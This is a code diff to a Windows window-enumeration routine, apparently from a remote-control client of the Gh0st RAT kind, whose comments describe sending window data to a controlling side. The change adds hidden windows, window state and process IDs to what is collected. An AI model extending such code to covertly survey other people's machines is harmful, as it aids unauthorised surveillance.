@@ -247,32 +247,58 @@ BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hWnd, LPARAM lParam)  //要�
     DWORD	dwLength = 0;
     DWORD	dwOffset = 0;
     DWORD	dwProcessID = 0;
-    LPBYTE	szBuffer = *(LPBYTE *)lParam;
-
+    LPBYTE	szBuffer = *(LPBYTE*)lParam;
     char	szTitle[1024];
     memset(szTitle, 0, sizeof(szTitle));
     //得到系统传递进来的窗口句柄的窗口标题
     GetWindowText(hWnd, szTitle, sizeof(szTitle));
     //这里判断 窗口是否可见 或标题为空
-    if (!IsWindowVisible(hWnd) || lstrlen(szTitle) == 0)
+    BOOL m_bShowHidden = TRUE;
+    if (!m_bShowHidden && !IsWindowVisible(hWnd)) {
         return true;
+    }
+    if (lstrlen(szTitle) == 0)
+        return true;
+
+    // ========== 新增：获取窗口属性 ==========
+    // 窗口状态
+    const char* szStatus = "normal";
+    if (IsIconic(hWnd)) {
+        szStatus = "minimized";
+    }
+    else if (IsZoomed(hWnd)) {
+        szStatus = "maximized";
+    }
+    else if (!IsWindowVisible(hWnd)) {
+        szStatus = "hidden";
+    }
+
+    // 所属进程ID
+    DWORD dwPid = 0;
+    GetWindowThreadProcessId(hWnd, &dwPid);
+
+    // 拼接属性到标题末尾
+    // 格式: 标题|状态|PID|保留1|保留2
+    // 解析时从末尾按 | 分割，保留字段方便未来扩展
+    char szTitleWithAttrs[1200];
+    sprintf(szTitleWithAttrs, "%s|%s|%lu|0|0", szTitle, szStatus, dwPid);
+    // ========== 新增结束 ==========
+
     //同进程管理一样我们注意他的发送到主控端的数据结构
     if (szBuffer == NULL)
         szBuffer = (LPBYTE)LocalAlloc(LPTR, 1);  //暂时分配缓冲区
     if (szBuffer == NULL)
         return FALSE;
     //[消息][4Notepad.exe\0]
-    dwLength = sizeof(DWORD) + lstrlen(szTitle) + 1;
+    dwLength = sizeof(DWORD) + lstrlen(szTitleWithAttrs) + 1;  // 使用新标题
     dwOffset = LocalSize(szBuffer);  //1
     //重新计算缓冲区大小
-    szBuffer = (LPBYTE)LocalReAlloc(szBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
+    szBuffer = (LPBYTE)LocalReAlloc(szBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
     if (szBuffer == NULL)
         return FALSE;
     //下面两个memcpy就能看到数据结构为 hwnd+窗口标题+0
-    memcpy((szBuffer+dwOffset),&hWnd,sizeof(DWORD));
-    memcpy(szBuffer + dwOffset + sizeof(DWORD), szTitle, lstrlen(szTitle) + 1);
-
-    *(LPBYTE *)lParam = szBuffer;
-
+    memcpy((szBuffer + dwOffset), &hWnd, sizeof(DWORD));
+    memcpy(szBuffer + dwOffset + sizeof(DWORD), szTitleWithAttrs, lstrlen(szTitleWithAttrs) + 1);  // 使用新标题
+    *(LPBYTE*)lParam = szBuffer;
     return true;
 }
